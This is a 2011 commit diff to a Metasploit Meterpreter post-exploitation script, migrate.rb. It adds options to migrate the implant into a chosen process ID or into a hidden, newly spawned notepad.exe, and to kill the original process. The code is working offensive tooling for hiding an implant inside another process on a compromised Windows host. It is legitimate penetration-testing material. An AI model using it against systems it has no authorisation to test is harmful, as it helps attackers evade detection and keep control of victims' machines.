7d7795eb4637f69a65f37c4825871bfef3662db7
Carlos Perez <carlos_perez@darkoperator.com>
2011-10-07 01:27:13 +0000

    Just to make sure they operate in a similar fashion until scripts are removed.
    git-svn-id: file:///home/svn/framework3/trunk@13827 4d416f70-5f16-0410-b530-b9f4589650da

--- scripts/meterpreter/migrate.rb
+++ scripts/meterpreter/migrate.rb
@@ -5,68 +5,70 @@
 #
 
 spawn = false
-target = nil
+kill = false
+target_pid = nil
 
 opts = Rex::Parser::Arguments.new(
 	"-h" => [ false,"Help menu." ],
-	"-f" => [ false, "Launch a process and migrate into the new process"]
+	"-f" => [ false, "Launch a process and migrate into the new process"],
+	"-p" => [ true , "PID to migrate to."],
+	"-k" => [ false,  "Kill original process."]
 )
 opts.parse(args) { |opt, idx, val|
 	case opt
 	when "-f"
 		spawn = true
+	when "-k"
+		kill = true
+	when "-p"
+		target_pid = val.to_i
 	when "-h"
-		print_line("")
-		print_line("USAGE:   run migrate [process name]")
-		print_line("EXAMPLE: run migrate explorer.exe")
 		print_line(opts.usage)
 		raise Rex::Script::Completed
 	else
-		target = val
+		print_line(opts.usage)
+		raise Rex::Script::Completed
 	end
 }
 
 
+# Creates a temp notepad.exe to migrate to depending the architecture.
+def create_temp_proc()
+	sysinfo =  client.sys.config.sysinfo
+	windir = client.fs.file.expand_path("%windir%")
+	# Select path of executable to run depending the architecture
+	if sysinfo['Architecture'] =~ /x86/
+		cmd = "#{windir}\\System32\\notepad.exe"
+	else
+		cmd = "#{windir}\\Sysnative\\notepad.exe"
+	end
+	# run hidden
+	proc = client.sys.process.execute(cmd, nil, {'Hidden' => true })
+	return proc.pid
+end
 
 if client.platform =~ /win32|win64/
 	server = client.sys.process.open
-
+	original_pid = server.pid
 	print_status("Current server process: #{server.name} (#{server.pid})")
 
-	target_pid = nil
-
-	if ! spawn
-		# Get the target process name
-		target ||= "lsass.exe"
-		print_status("Migrating to #{target}...")
-
-		# Get the target process pid
-		target_pid = client.sys.process[target]
-
-		if not target_pid
-			print_error("Could not access the target process")
-			print_status("Spawning a notepad.exe host process...")
-			note = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })
-			target_pid = note.pid
-		end
-	else
-		target ||= "notepad.exe"
-		print_status("Spawning a #{target} host process...")
-		newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
-		target_pid = newproc.pid
-		if not target_pid
-			print_error("Could not create a process around #{target}")
-			raise Rex::Script::Completed
-		end
+	if spawn
+		print_status("Spawning notepad.exe process to migrate to")
+		target_pid = create_temp_proc
 	end
 
-	# Do the migration
-	print_status("Migrating into process ID #{target_pid}")
-	client.core.migrate(target_pid)
-	server = client.sys.process.open
-	print_status("New server process: #{server.name} (#{server.pid})")
+	begin
+		print_good("Migrating to #{target_pid}")
+		client.core.migrate(target_pid)
+		print_good("Successfully migrated to process #{}")
+	rescue ::Exception => e
+		print_error("Could not migrate in to process.")
+		print_error(e)
+	end
 
-else
-	print_error("This version of Meterpreter is not supported with this Script!")
-	raise Rex::Script::Completed
+	if kill
+		print_status("Killing original process with PID #{original_pid}")
+		client.sys.process.kill(original_pid)
+		print_good("Successfully killed process with PID #{original_pid}")
+	end
 end
